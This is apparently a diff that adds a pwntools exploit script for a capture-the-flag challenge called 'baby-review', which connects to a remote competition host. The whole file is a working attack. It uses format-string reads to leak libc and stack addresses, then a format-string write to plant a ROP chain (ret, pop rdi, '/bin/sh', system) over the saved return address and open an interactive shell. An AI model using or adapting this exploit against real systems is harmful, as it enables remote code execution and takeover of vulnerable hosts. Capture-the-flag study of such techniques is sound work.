@@ -1,0 +1,66 @@
+#!/usr/bin/env python3
+from pwn import *
+
+exe = ELF("./baby-review_patched")
+libc = ELF("./libc.so.6")
+
+context.binary = exe
+context.terminal = ['st']
+
+#r = process([exe.path])
+#r = gdb.debug([exe.path])
+r = remote('chals.damctf.xyz', 30888)
+
+
+def main():
+    print(r.recvlines(2))
+    capital = input()
+    r.sendline(str.encode(capital))
+
+    r.sendlineafter(b"Exit", b"5")
+    # %8$p is 0x7fffffffddd0
+    # saved rip is 0x7fffffffddd8 
+    r.sendlineafter(b"list", b"%3$p.%8$p")
+    r.sendlineafter(b"Exit", b"2")
+    r.readlines(6)
+
+    leaked = r.recvline().strip()
+    addr_in_libc = int(leaked[2:2+12], 16)
+    stack_rip    = int(leaked[15:], 16) 
+    print(hex(addr_in_libc))
+    print(hex(stack_rip))
+
+    off = 0x114a37
+    libc.address = addr_in_libc - off
+    
+    binsh = next(libc.search(b'/bin/sh\0'))
+    print("binsh: " + str(hex(binsh)))
+
+    pop_rdi_ret = libc.address + 0x002a3e5
+    print("pop_rdi: " + str(hex(pop_rdi_ret)))
+    print("system: " + str(hex(libc.symbols['system'])))
+
+    print("writing binsh to: " + str(hex(stack_rip + 16)))
+    print("writing system to: " + str(hex(stack_rip + 24)))
+    
+    offset = 10
+    ret = libc.address + 0x00029cd6
+    writes = {
+        stack_rip + 8: ret,
+        stack_rip + 16: pop_rdi_ret,
+        stack_rip + 24: binsh,
+        stack_rip + 32: libc.symbols['system'],
+    }
+
+    payload = fmtstr_payload(offset, writes, write_size='short')
+
+    r.sendlineafter(b"Exit", b"5")
+    r.sendlineafter(b"list", payload)
+    r.sendlineafter(b"Exit", b"2")
+
+    r.sendlineafter(b"Exit", b"4")
+    r.sendline(b'a')
+    r.interactive()
+
+if __name__ == "__main__":
+    main()
